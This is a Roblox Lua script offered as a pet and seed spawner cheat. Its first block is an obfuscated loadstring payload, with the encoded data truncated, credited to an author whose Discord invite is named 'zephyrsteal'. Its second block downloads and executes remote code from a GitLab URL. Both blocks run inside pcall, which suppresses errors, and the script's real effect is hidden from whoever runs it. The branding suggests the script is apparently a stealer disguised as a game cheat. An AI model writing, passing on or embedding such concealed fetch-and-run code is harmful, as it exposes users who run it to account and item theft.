-- Obfuscated Script by Namnni2 | Join our server: https://discord.gg/zephyrsteal
pcall(function()
    loadstring((function(...)local W={"\074\120\073\056\070\120\087\086\083\068\074\051\099\071\047\047\083\113\101\061", "\100\056\069\111\066\085\076\065\085\078\110\102\057\118\121\050\068\097\115\072\071\079\051\052\069\114\118\122\086\049\099\109\057\067\055\055\070\121\099\101\067\071\066\053\100\087\118\107\052\048\078\047\088\110\076\118\076\089\119\074\104\073\075\118\079\078\122\103\057\065\118\051\111\071\070\120\101\122\108\103\102\103\103\083\104\115\051\120\079\105\109\057\049\050\057\055\100\098\070\111\116\122\052\122\100\067\113\078\112\083\100\099\068\111\081\065\048\112\113\076\101\097\120\066\104\099\101\097\084\081\082\083\108\103\049\107\055\083\069\074\075\112\055\106\047\069\102\087\116\099\078\117\047\052\066\055\047\075\106\067\070\048\061\061","\117\078\066\109\102\107\074\113\085\065\057\..."} -- you must paste the full obfuscated data here
for i,v in pairs(W)do W[i]=string.char(table.unpack({v:byte(1,-1)}))end return table.concat(W)end)())()
end)

-- Spawner Script
pcall(function()
    local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
    Spawner.GetPets()
    Spawner.GetSeeds()
    Spawner.GetEggs()
    Spawner.SpawnPet("Raccoon", 1, 2)
    Spawner.SpawnSeed("Candy Blossom")
    Spawner.SpawnEgg("Night Egg")
    Spawner.Spin("Sunflower")
    Spawner.Load()
end)
